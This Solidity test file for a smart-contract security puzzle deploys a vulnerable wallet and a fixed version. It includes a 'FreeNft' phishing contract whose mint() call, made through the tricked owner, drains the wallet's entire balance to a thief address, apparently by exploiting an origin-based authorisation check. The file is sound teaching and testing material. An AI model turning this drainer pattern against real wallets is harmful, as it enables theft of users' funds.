// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;
import {Wallet} from "../src/Wallet.sol";
import {WalletFixed} from "../src/WalletFixed.sol";
interface Vm { function prank(address) external; function prank(address, address) external; function deal(address, uint256) external; function addr(uint256) external returns (address); function sign(uint256, bytes32) external returns (uint8, bytes32, bytes32); function expectRevert() external; }
Vm constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
interface IW { function pay(address payable, uint256) external; }
contract FreeNft { // phishing contract the owner is tricked into calling
    IW w; address payable thief;
    constructor(IW _w, address payable _t) { w = _w; thief = _t; }
    function mint() external { w.pay(thief, address(w).balance); }
}
contract Puzzle002Test {
    address owner = address(0xA11CE);
    address payable thief = payable(address(0xBAD));
    function _deploy(bool fixed_) internal returns (IW w) {
        vm.prank(owner);
        w = fixed_ ? IW(address(new WalletFixed{value: 0}())) : IW(address(new Wallet{value: 0}()));
        vm.deal(address(w), 10 ether);
    }
    function _phish(IW w) internal { FreeNft n = new FreeNft(w, thief); vm.prank(owner, owner); n.mint(); }
    function test_exploitWorksOnVulnerable() public { IW w = _deploy(false); _phish(w); require(thief.balance == 10 ether, "drained"); }
    function test_exploitFailsOnFixed() public { IW w = _deploy(true); try this.phishExt(w) {} catch {} require(thief.balance == 0 && address(w).balance == 10 ether, "safe"); }
    function phishExt(IW w) external { _phish(w); }
    function _normal(IW w) internal { vm.prank(owner, owner); w.pay(payable(address(0xB0B)), 1 ether); require(address(0xB0B).balance == 1 ether, "paid"); }
    function test_normalUseVulnerable() public { _normal(_deploy(false)); }
    function test_normalUseFixed() public { _normal(_deploy(true)); }
}
